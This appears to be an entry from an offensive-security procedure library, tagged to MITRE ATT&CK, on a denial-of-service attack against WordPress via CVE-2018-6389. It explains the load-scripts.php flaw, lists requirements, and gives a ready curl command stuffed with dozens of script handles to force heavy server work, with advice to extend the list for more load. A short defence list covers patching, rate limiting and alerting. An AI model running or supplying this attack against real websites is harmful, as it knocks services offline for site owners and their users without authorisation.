---
id: proc-uuid-2
tags:
  - dos
  - wordpress
  - cve-2018-6389
  - http-flood
type: procedure
tools: []
tactics:
  - '[[Impact]]'
commands:
  - '[[commands/curl-wordpress-load-scripts-dos]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Endpoint Denial of Service]]'
updated_at: '2025-12-14T17:26:30.139Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques:
  - '[[OS Exhaustion Flood]]'
validated: true
mitre_tactics:
  - '[[Impact]]'
mitre_techniques:
  - '[[Endpoint Denial of Service]]'
---
# Craft GET Request for Large Data Generation

## Summary

This procedure constructs and sends a crafted HTTP GET request to the WordPress load-scripts.php endpoint with an extensive 'load' parameter, forcing the server to generate and transmit approximately 3MB of concatenated JavaScript data, consuming significant CPU and memory.

## Description

CVE-2018-6389 stems from the endpoint's inefficient handling of long comma-separated lists of script handles (e.g., jquery, utils, etc.), loading each file without limits. This single request can exhaust resources on vulnerable servers (WordPress <4.9.5). The attack requires no authentication and targets public-facing sites.

## Requirements

1. Identified vulnerable endpoint from prior recon
2. List of WordPress script handles (common ones: eutil, common, wp-a11y, etc.)
3. HTTP client like curl

## Defense

Defensive measures and detection strategies:

- Patch to WordPress 4.9.5 or later
- Rate-limit requests to /wp-admin/load-scripts.php
- Resource quotas on PHP processes
- Log and alert on large 'load' parameter values

## Objectives

1. Trigger resource-intensive JS concatenation
2. Observe single-request impact
3. Validate ~3MB output

## Instructions

### Step 1: Prepare the Request URL

**Context**: Build the 'load' parameter with 50+ script handles to maximize size.

Example list: eutil,common,wp-a11y,quicktags,svg-painter,jquery,... (extend to achieve 3MB).

### Step 2: Execute the Request

**Context**: Send the GET request to download the large response.

**Command** ([[commands/curl-wordpress-load-scripts-dos]]):
```bash
curl "https://target.com/wp-admin/load-scripts.php?load=eutil,common,wp-a11y,quicktags,svg-painter,jquery,jquery-core,jquery-migrate,utils,wplink,wp-emoji-release,underscore,shortcode,media-upload,word-count,media-editor,media-views,media-models,wp-plupload,plupload-all,wp-editor,editor,wp-medialib-widget,mce-view,wp-api,heartbeat,buttons,wp-auth-check,svg-filter,jquery-ui-core,jquery-ui-widget,jquery-ui-mouse,jquery-ui-sortable,jquery-ui-draggable,jquery-ui-droppable,jquery-ui-slider,jquery-ui-button,jquery-ui-position,jquery-ui-dialog,jquery-ui-datepicker,jquery-ui-progressbar,jquery-ui-tabs,wp-backbone,wp-util,wp-settings,thickbox,shortcode" -o response.js
```

> This command fetches the concatenated JS; check file size with `ls -lh response.js`. Expect high server load during execution.

## MITRE ATT&CK Mapping

### Tactics

- [[Impact]] Impact

### Techniques

- [[Endpoint Denial of Service]] Endpoint Denial of Service

### Sub-Techniques

- [[OS Exhaustion Flood]] OS Exhaustion Floods

## Commands Used

- [[commands/curl-wordpress-load-scripts-dos]]

## Tools Used


## Tags

- dos
- wordpress
- cve-2018-6389
- http-flood
